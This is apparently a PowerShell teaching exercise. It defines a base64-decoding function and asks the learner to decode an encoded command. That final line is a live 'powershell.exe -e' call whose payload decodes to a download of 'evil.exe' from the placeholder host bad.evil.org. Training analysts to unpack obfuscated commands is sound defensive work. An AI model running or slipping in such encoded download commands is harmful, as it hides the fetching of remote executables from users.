﻿##################################
# 
# Practical Exercise 8
# Importing a custom function
#
##################################
# This function will decode a base64 string. Run the fuction and then decode the base64 file.

function decode-base64 {
### Example Command 
# decode-base64 -base64 $string 
# decode-base64 -base64 aGVsbG8=
 param( [string]$base64 )
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
}

# Now use the function above to decode the following encoded command below
# Decode the following powershell encoded command 
powershell.exe -e "aW52b2tlLXdlYnJlcWVzdCAtdXJpIGh0dHA6Ly9iYWQuZXZpbC5vcmcgLW91dGZpbGUgZXZpbC5leGU="


